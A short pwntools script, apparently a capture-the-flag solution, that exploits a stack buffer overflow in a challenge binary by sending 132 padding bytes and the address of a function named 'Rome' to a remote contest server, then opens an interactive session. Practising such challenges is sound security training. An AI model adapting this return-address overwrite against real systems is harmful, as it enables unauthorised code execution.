from pwn import *

elf = context.binary = ELF("./chall")

p = remote("challs.pwny.shellmates.club",1003)

payload = flat([
    b"A" * 132,
    elf.sym["Rome"]
])

p.sendline(payload)

p.interactive()